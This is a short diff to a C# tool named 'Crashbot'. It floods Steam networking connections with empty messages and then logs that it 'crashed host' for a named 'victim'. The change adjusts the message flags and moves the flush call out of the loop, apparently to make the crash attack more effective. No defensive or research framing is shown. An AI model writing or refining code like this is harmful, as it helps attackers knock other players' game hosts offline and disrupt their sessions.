@@ -229,10 +229,11 @@ namespace Crashbot
                 {
                     for (int i = 0; i < FUN_TIME; i++)
                     {
-                        this.SteamThread.SendMessageToConnection(conn, [], 0, 3);
-                        this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
+                        this.SteamThread.SendMessageToConnection(conn, [], 0, 0);
+                        
                         // Task.Delay(20).Wait();
                     }
+                    this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
 
                     mega_victim.OnVictimCrashed();
                     Logger.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
